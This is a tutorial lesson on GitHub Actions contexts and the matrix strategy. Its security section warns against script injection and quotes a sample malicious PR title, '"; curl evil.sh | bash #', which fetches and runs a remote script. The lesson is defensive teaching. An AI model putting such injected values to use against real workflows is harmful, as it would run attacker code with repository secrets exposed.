# Day 61 — GitHub Actions Fundamentals: Contexts & Matrix Strategy

**Phase:** 2 – CI/CD & Security | **Week:** W10 | **Domain:** CI/CD | **Flag:** ⚡ Interview-critical

## Brief

Once you can write a basic workflow, the next skill is making it *dynamic* — reading information about the event that triggered it, injecting configuration safely, and running the same job across many variations (Node 18/20/22, three OSes, etc.) without copy-pasting the job six times. Contexts and the matrix strategy are how you do both, and interviewers probe this because it separates people who've copied a tutorial workflow from people who've actually engineered one for a real multi-environment codebase.

## Contexts: GitHub's built-in variable namespaces

A **context** is a structured object you access with `${{ }}` expression syntax, available almost anywhere in a workflow (not inside `run:` shell scripts directly as native variables — more on that below). The four you'll use constantly:

```yaml
steps:
  - name: Show context info
    run: |
      echo "Repo: ${{ github.repository }}"
      echo "Actor: ${{ github.actor }}"
      echo "Event: ${{ github.event_name }}"
      echo "SHA: ${{ github.sha }}"
      echo "Branch/ref: ${{ github.ref }}"
      echo "PR number: ${{ github.event.pull_request.number }}"
    env:
      MY_ENV: ${{ env.SOME_VAR }}
```

| Context | What it holds |
|---|---|
| `github` | Metadata about the triggering event, repo, actor, SHA, ref, and the full webhook payload under `github.event.*` |
| `env` | Variables set at workflow, job, or step level via `env:` blocks |
| `secrets` | Encrypted secrets configured in repo/org/environment settings — values are masked in logs automatically |
| `runner` | Info about the runner executing the job: OS, temp dir, architecture |
| `jobs`/`needs`/`steps` | Outputs from other jobs/steps (see file 1) |
| `vars` | Configuration **Variables** (non-secret) set at repo/org/environment level |
| `inputs` | Inputs passed into a reusable workflow or `workflow_dispatch` |

### The critical safety rule: `${{ }}` expressions vs shell variables

```yaml
# DANGEROUS — untrusted input interpolated directly into the shell
- run: echo "Building PR titled ${{ github.event.pull_request.title }}"

# SAFE — pass through an env var, let the shell handle it as data, not code
- run: echo "Building PR titled $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

This is one of the most important, most-overlooked security details in GitHub Actions. `${{ github.event.pull_request.title }}`, `github.event.issue.body`, `github.head_ref`, and similar fields are **attacker-controlled** — anyone can open a PR with a title like `"; curl evil.sh | bash #`. If you interpolate that directly into a `run:` block, GitHub does a literal text substitution *before* the shell ever sees it, so the attacker's string becomes part of the actual script and executes. Routing it through `env:` first means the value is passed as inert environment data — the shell sees `$PR_TITLE` as a variable, not as code to parse. This exact pattern (a poisoned PR title/branch name executing arbitrary code inside a workflow with repo secrets in scope) has been used in real supply-chain attacks against major open-source projects.

## Matrix strategy: one job definition, many runs

```yaml
jobs:
  test:
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest]
        node: [18, 20, 22]
        include:
          - os: ubuntu-latest
            node: 22
            experimental: true
        exclude:
          - os: macos-latest
            node: 18
    runs-on: ${{ matrix.os }}
    continue-on-error: ${{ matrix.experimental == true }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci && npm test
```

- The `matrix` block is a **cartesian product** by default: 2 OSes × 3 Node versions = 6 parallel job runs, each substituting `matrix.os`/`matrix.node`.
- `exclude` removes specific combinations from that product (here, dropping macOS + Node 18).
- `include` does two things at once: it can add an *extra* combination not in the cartesian product, and/or attach extra keys (like `experimental: true`) to matching combinations for use elsewhere in the job (like `continue-on-error`).
- `fail-fast: false` is essential for real matrix testing — the **default is `true`**, meaning the instant one matrix combination fails, GitHub cancels all other in-progress combinations. That's fine if you just want a fast "did it break," but wrong if you want a full compatibility report across every OS/version combination.
- `continue-on-error` on a per-matrix-entry basis lets you mark certain combinations (e.g., a bleeding-edge/experimental version) as "allowed to fail" without failing the whole required check.

## Why matrix beats copy-pasted jobs

Besides the obvious DRY win, a matrix gives you a single check-run summary in the PR UI (one job "Test" expands to show all combinations), a single place to tune `fail-fast`/`max-parallel`, and it scales — adding a new Node version is a one-line diff instead of duplicating an entire job block and its `needs`/`if` wiring.

```yaml
strategy:
  max-parallel: 2   # throttle concurrent matrix jobs, e.g. to respect a shared resource's rate limit
  matrix:
    shard: [1, 2, 3, 4]
```

`max-parallel` is worth knowing for cost/rate-limit control — e.g., four shards of an expensive integration test suite hitting a shared staging database might need to run at most two at a time.

## Points to Remember

- Never interpolate `github.event.*` fields (PR titles, branch names, issue bodies, commit messages) directly inside a `run:` block — always route them through `env:` first to avoid script injection.
- `secrets` values are automatically masked in logs (replaced with `***`), but only for exact string matches — don't assume base64-encoding or splitting a secret defeats masking; it doesn't hide it from someone with write access reading the raw output some other way, and it can actually break masking, exposing the value.
- Matrix `fail-fast` defaults to `true` — set it to `false` explicitly if you want a full compatibility matrix report instead of an early cancel.
- `matrix.include` can both add extra combinations and attach metadata to existing ones — it's doing two different jobs depending on whether the keys match an existing combination.
- `vars` (Variables) and `secrets` are separate namespaces — non-sensitive config (like a default region or feature flag) belongs in `vars`, not `secrets`, so it's visible/auditable rather than masked.

## Common Mistakes

- Directly embedding `${{ github.event.pull_request.title }}` or similar into a `run:` script — the single highest-severity GitHub Actions security mistake, enabling script injection from any external contributor.
- Forgetting `fail-fast: false` and being confused why 5 of 6 matrix jobs show "cancelled" instead of their real pass/fail status after one failed.
- Building a giant matrix (say 5 OSes × 8 language versions × 3 architectures = 120 jobs) without `max-parallel` or `exclude`, burning CI minutes and hitting concurrent-job limits.
- Treating `matrix.include` entries as always-additive — forgetting that if the keys match an existing cartesian-product entry, it merges into (and can override) that entry instead of creating a new one.
- Assuming `secrets.*` are available inside a job triggered by a `pull_request` from a fork — GitHub deliberately withholds most secrets on fork PRs for security, which surprises people whose CI "mysteriously" fails only on external contributions.
